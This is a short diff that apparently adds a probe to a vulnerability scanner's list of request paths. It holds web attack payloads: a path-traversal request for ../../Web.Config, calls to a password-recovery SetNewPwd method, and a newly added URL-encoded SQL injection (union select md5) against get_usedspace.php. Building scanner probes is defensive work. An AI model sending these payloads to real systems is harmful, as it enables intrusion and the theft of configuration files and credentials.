@@ -1,3 +1,4 @@
 /tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method={{randbase(6)}}
 /tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd
 /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config
+/webservice/get_usedspace.php?site_id=-1%20and%201=2%20union%20all%20select%20(md5({{num}}))
